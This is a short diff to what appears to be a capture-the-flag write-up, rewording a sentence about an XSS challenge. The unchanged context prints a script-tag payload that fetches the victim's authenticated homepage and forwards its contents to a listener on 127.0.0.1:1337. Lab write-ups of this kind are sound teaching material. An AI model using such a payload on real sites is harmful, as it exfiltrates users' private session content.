@@ -232,4 +232,5 @@ I created an index.html file with the following content and served via "python3 
 This is what it says without the URL encoding:
 <script>fetch("http://challenge.localhost/").then(r=>r.text()).then(t=>fetch("127.0.0.1:1337?msg="+t))</script>
 
-Since we can't read the cookie through JS here, we just use the session we have and send our listener what our homepage would have displayed if we logged in as authenticated. Running the listener, /challenge/server and /challenge/victim gets us the flag.
+Here we use the session we have and send our listener what our homepage would have displayed if we logged in as authenticated. Running the listener, /challenge/server and /challenge/victim gets us the flag.
+
